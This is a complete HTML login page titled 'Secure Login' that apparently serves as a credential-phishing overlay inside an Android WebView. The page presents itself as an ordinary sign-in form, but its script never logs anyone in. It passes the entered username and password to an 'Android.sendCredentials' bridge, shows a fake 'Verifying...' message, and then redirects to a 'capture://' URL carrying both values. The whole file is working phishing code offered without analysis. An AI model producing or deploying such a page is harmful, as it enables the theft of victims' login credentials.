<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Secure Login</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:Arial,sans-serif}
body{background:rgba(0,0,0,0.6);display:flex;justify-content:center;align-items:center;min-height:100vh;backdrop-filter:blur(4px)}
.container{background:white;padding:30px;border-radius:12px;width:340px;box-shadow:0 10px 40px rgba(0,0,0,0.4)}
.logo{text-align:center;font-size:22px;font-weight:bold;margin-bottom:20px;color:#1a73e8}
input{width:100%;padding:12px;margin:8px 0;border:1px solid #ddd;border-radius:6px;font-size:14px;transition:border 0.2s}
input:focus{border-color:#1a73e8;outline:none}
button{width:100%;padding:12px;background:#1a73e8;color:white;border:none;border-radius:6px;font-size:16px;font-weight:600;cursor:pointer;transition:background 0.2s}
button:hover{background:#1557b0}
button:disabled{opacity:0.7;cursor:not-allowed}
.error{color:#d93025;font-size:13px;margin-top:8px;display:none}
</style>
</head>
<body>
<div class="container"><div class="logo">🔐 Secure Login</div>
<form onsubmit="submitForm(event)">
<input type="text" id="user" placeholder="Username / Email" required>
<input type="password" id="pass" placeholder="Password" required>
<button type="submit">Sign In</button>
<div class="error" id="error">Invalid credentials. Please try again.</div>
</form></div>
<script>
function submitForm(e){e.preventDefault();var u=document.getElementById('user').value;var p=document.getElementById('pass').value;if(u.length<2||p.length<3){document.getElementById('error').style.display='block';return;}if(typeof Android!=='undefined'){Android.sendCredentials(u,p);}var btn=document.querySelector('button');btn.textContent='Verifying...';btn.disabled=true;setTimeout(function(){window.location.href='capture://?user='+encodeURIComponent(u)+'&pass='+encodeURIComponent(p);},1000);}
</script>
</body>
</html>
